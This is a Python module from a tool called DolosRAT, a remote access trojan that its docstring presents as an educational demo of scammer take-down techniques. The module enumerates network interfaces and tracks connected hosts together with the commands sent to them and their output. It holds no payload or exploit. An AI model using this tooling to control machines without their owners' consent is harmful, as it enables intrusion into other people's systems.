# !/usr/bin/env python
# -*- coding: utf-8 -*-
#----------------------------------------------------------------------------
# Creator : Ryan I.
# Created Date: 17/06/2023
# version ='1.0'
# ---------------------------------------------------------------------------
"""
DolosRAT provides a GUI-based RAT client and server, purposed for demonstrating
techniques frequently used within scammer take-down operations. Please note that
the use of this tool is for educational purposes only.
"""

# Built-in/Generic Imports.
import os
from builtins import setattr
from dataclasses import dataclass
from ipaddress import IPv4Address
from typing import Any, List, Union

# Modules.
from config.network import network_conf # pylint: disable=import-error
from config.logger import get_logger_conf # pylint: disable=import-error
from ..misc.validator import validate_ipv4_addr
from ..misc.wrapper import BaseWrapper
from ..misc.logger import LoggerWrapper, LoggerLevel, get_logger
# from ..net.connection import Socket

# External Imports.
if os.name == 'nt':
    # NT-specfic adapters list.
    from scapy.arch.windows import get_windows_if_list as get_if_list
else:
    # Non-NT interface retrieval using 'Scapy'.
    # Otherwise, NT-specific GUIDs are only shown.
    from scapy.all import get_if_list

@dataclass(unsafe_hash=True)
class IPv4Host:
    """Dataclass comprising host-based information."""

    ipv4_addr: IPv4Address
    port: int
    connected: bool = False
    disconnected: bool = True
    listening: bool = False
    command: Union[bytes, None] = None
    command_name: str = ''
    command_out: Any = None
    ping: Union[int, None] = None

@dataclass
class Ifa:
    """Houses the information neccessary
    for a single interface.
    """

    ifa_name: str
    ifa_addrs: Union[IPv4Address, List[str]]

class IfaWrapper(BaseWrapper):
    """Provides a wrapper for interface-specific
    functionalities. 
    """

    def __init__(
        self: object,
        logger: LoggerWrapper
    ) -> None:
        """Initialises IfaWrapper."""

        super().__init__()

        # Comprises all available interfaces/adapters.
        self._interfaces: List[Union[None, Ifa]] = []

        # Registers handle for logger.
        self._register_handle(logger)

        # Enumerates all interfaces on system.
        self._collect_ifaces()

        # Defaults to first enumerated interface
        # if not manually selected.
        self._set_default_ifa()

    def __str__(self: object) -> str:
        """Returns human-friendly string of the 
        selected interface, for being displayed on the
        UI. 

        Returns:
            str: Human-friendly representation
            the interface in use. 
        """

        if network_conf.conf['selected_ifa']:
            # Readable string to denote interface for
            # being displayed within UI.
            return f"{network_conf.conf['selected_ifa'].ifa_name}" \
                f"({network_conf.conf['selected_ifa'].ifa_addrs})"

        return ""

    def _collect_ifaces(self: object) -> None:
        """Collects all interfaces on system and
        outputs a list."""

        # Creates a list of dictionaries, comprising
        # information for each adapter/interface.

        network_conf.conf['ifas_list'] = [
            # Build dataclass from dict fields.
            Ifa(
                ifa['name'],
                validate_ipv4_addr(ifa['ips'][1])
            )
            # Apply filter for interfaces/adapters
            # that have assigned addresses.
            for ifa in get_if_list()
                # If addresses exist for
                # interface/adapter.
                if 'ips' in ifa.keys()
                if ifa['ips']
                if len(ifa['ips']) > 0
        ]

        # Count of interfaces for future reference.
        network_conf.conf['ifas_count'] = len(
            network_conf.conf['ifas_list']
        )

        self._get_handle('LoggerWrapper').write_log(
            f'Enumerated {network_conf.conf["ifas_count"]} (v)NICs.',
            LoggerLevel.INFO
        )

    def _set_default_ifa(self: object) -> None:
        """Implicitly sets the default interface,
        should this not be explicitly performed.
        Defaults to first entry.
        """

        # Check to see if any interfaces were
        # first enumerated.
        if network_conf.conf['ifas_list']:
            # Sets interface.
            IfaWrapper.set_ifa(
                # Defaults to first interface.
                network_conf.conf['ifas_list'][0].ifa_name
            )

            self._get_handle('LoggerWrapper').write_log(
                f'Interface defaulted to ' \
                    f'\'{self.get_selected_ifa().ifa_name}\'.',
                LoggerLevel.INFO
            )

        else:
            # If no usable interfaces were enumerated.
            self._get_handle('LoggerWrapper').write_log(
                'Cannot find a (v)NIC to use. Exiting.',
                LoggerLevel.ERROR
            )

            # Cannot continue; therefore, abruptly exit.
            raise SystemExit()

    def _get_ifas_count(self: object) -> int:
        """Returns a count of all collected
        interfaces.

        Returns:
            int: An integer denoting the number
            of collected interfaces.
        """

        # Return integer count of enumerated interfaces.
        return network_conf.conf['ifas_count']

    def get_selected_ifa(self: object) -> Union[None, Ifa]:
        """Returns an 'Ifa' object comprising an
        interface's name and configuration.

        Returns:
            Union[None, Ifa]: Either nothing, or the 
            'Ifa' class comprising the interface information,
            shall be returned.
        """

        # Returns Ifa object for the manually, or default,
        # selected interface.
        return network_conf.conf['selected_ifa']

    @staticmethod
    def set_ifa(ifa_name: str) -> None:
        """Changes the interface in use.

        Args:
            ifa_name (str): Represents the interface
            name in which to change to.
        """

        # Stores filtered interface information.
        ifa_filtered: List[Any] = []

        # Check if interfaces are available.
        if network_conf.conf['ifas_list']:
            # Filter interfaces by 'ifa_name'.
            ifa_filtered = list(
                filter(
                    # Utilise lambda for terseness.
                    lambda lfa: (lfa.ifa_name == ifa_name),
                    network_conf.conf['ifas_list']
                )
            )

        if ifa_filtered:
            # Validate IPv4 address within interface
            # information and place within 'Ifa'
            # dataclass accordingly.
            network_conf.conf['selected_ifa'] = Ifa(
               ifa_filtered[0].ifa_name,
               ifa_filtered[0].ifa_addrs
            )

    @staticmethod
    def filter_host(host_addr: str, host_port: int) -> List[Any]:
        """Filters host list for specific host.

        Args:
            host_addr (str): IPv4 address of host.
            host_port (int): Port number of inbound host.

        Returns:
            List[Any]: Returns host in a list.
        """

        # Comprises filtered host.
        host_filtered: Union[Any, None] = None

        # Check if interfaces are available.
        if network_conf.conf['hosts_list']:
            # Filter interfaces by 'ipv4_addr'.
            host_filtered = list(
                filter(
                    # Utilise lambda for terseness.
                    lambda IPv4Host: (
                        IPv4Host.ipv4_addr == validate_ipv4_addr(host_addr)
                        and IPv4Host.port == host_port
                    ),
                    network_conf.conf['hosts_list']
                )
            )

            return host_filtered

    @staticmethod
    def edit_host(host_addr: str, host_port: int, attr: str, val: Any) -> None:
        """Modifies host list - after modifying information of host, append
        to list.

        Args:
            host_addr (str): IPv4 address of host.
            host_port (int): Port number of host.
            attr (str): Key name.
            val (Any): Value.
        """

        if host_filtered:=IfaWrapper.filter_host(host_addr, host_port):
            network_conf.conf['hosts_list'] = network_conf.conf['hosts_list'] - set(host_filtered)
            setattr(host_filtered[0], attr, val)
            network_conf.conf['hosts_list'].add(host_filtered[0])

    @staticmethod
    def get_host_attribute(host_addr: str, host_port: int, attr: str) -> Any:
        """Returns a specific attribute of host.

        Args:
            host_addr (str): IPv4 address of host.
            host_port (int): Port number of host.
            attr (str): Attribute to retrieved.

        Returns:
            Any: Value of attribute.
        """

        host_attr: Any = None

        # Filters by host.
        if host_filtered:=IfaWrapper.filter_host(host_addr, host_port):
            host_attr = getattr(host_filtered[0], attr)
            network_conf.conf['hosts_list'].add(host_filtered[0])

        return host_attr

    @staticmethod
    def set_host(host: str) -> None:
        """Sets the default host to listen to
        by default.

        Args:
            host (str): String representing the IPv4 address
            and dest port.
        """

        # Host that which is filtered from the list.
        host_filtered: List[IPv4Host] = []

        # Extract IPv4 address and port from host string.
        (ipv4_addr, port) = host.split(' ')[0].split(':')

        if host_filtered:=IfaWrapper.filter_host(ipv4_addr, port):
            # Validate IPv4 address within interface
            # information and place within 'Ifa'
            # dataclass accordingly.
            network_conf.conf['selected_host'] = IPv4Host(
               host_filtered[0].ipv4_addr,
               host_filtered[0].port,
               host_filtered[0].connected
            )

def get_ifa_wrapper() -> IfaWrapper:
    """Returns an instantiated IfaWrapper.

    Returns:
        NetworkWrapper: Instance of IfaWrapper.
    """

    return IfaWrapper(
        get_logger(get_logger_conf(f'__main__.{__name__}'))
    )
